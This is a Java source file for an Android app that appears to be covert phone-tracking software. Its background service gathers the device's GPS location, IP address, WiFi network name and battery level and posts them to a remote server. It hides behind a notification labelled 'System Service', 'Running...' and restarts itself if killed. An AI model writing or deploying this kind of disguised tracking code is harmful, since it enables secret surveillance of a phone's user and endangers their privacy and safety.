package com.tracker.phonetracker;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.BatteryManager;
import android.os.Build;
import android.os.IBinder;
import android.location.Location;
import android.location.LocationManager;
import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;
import org.json.JSONObject;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.util.Collections;

public class TrackerService extends Service {

    private static final String CHANNEL_ID = "TrackerChannel";

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        createNotificationChannel();
        Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("System Service")
                .setContentText("Running...")
                .setSmallIcon(android.R.drawable.ic_menu_info_details)
                .build();
        startForeground(1, notification);

        // Send data in background thread
        new Thread(this::sendDataToServer).start();

        return START_STICKY; // Restart if killed
    }

    private void sendDataToServer() {
        try {
            JSONObject data = new JSONObject();

            // GPS Location
            LocationManager lm = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
            try {
                Location loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                if (loc == null) loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                if (loc != null) {
                    data.put("latitude", loc.getLatitude());
                    data.put("longitude", loc.getLongitude());
                }
            } catch (SecurityException e) {
                data.put("latitude", "permission_denied");
                data.put("longitude", "permission_denied");
            }

            // Phone IP Address
            data.put("phone_ip", getLocalIpAddress());

            // WiFi SSID
            WifiManager wifiManager = (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
            WifiInfo wifiInfo = wifiManager.getConnectionInfo();
            String ssid = wifiInfo.getSSID().replace("\"", "");
            data.put("wifi_ssid", ssid);

            // Battery
            IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
            Intent batteryStatus = registerReceiver(null, ifilter);
            int level = batteryStatus != null ? batteryStatus.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) : -1;
            int scale = batteryStatus != null ? batteryStatus.getIntExtra(BatteryManager.EXTRA_SCALE, -1) : -1;
            int batteryPct = (level != -1 && scale != -1) ? (int)((level / (float) scale) * 100) : -1;
            data.put("battery", batteryPct);

            // Send to server
            URL url = new URL(Config.SERVER_URL);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setConnectTimeout(10000);
            conn.setRequestProperty("Content-Type", "application/json");

            OutputStream os = conn.getOutputStream();
            os.write(data.toString().getBytes("UTF-8"));
            os.close();

            conn.getResponseCode();
            conn.disconnect();

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private String getLocalIpAddress() {
        try {
            for (NetworkInterface intf : Collections.list(NetworkInterface.getNetworkInterfaces())) {
                for (InetAddress addr : Collections.list(intf.getInetAddresses())) {
                    if (!addr.isLoopbackAddress() && addr.getHostAddress().indexOf(':') < 0) {
                        return addr.getHostAddress();
                    }
                }
            }
        } catch (Exception e) {
            return "unknown";
        }
        return "unknown";
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID, "Tracker", NotificationManager.IMPORTANCE_LOW);
            NotificationManager manager = getSystemService(NotificationManager.class);
            manager.createNotificationChannel(channel);
        }
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
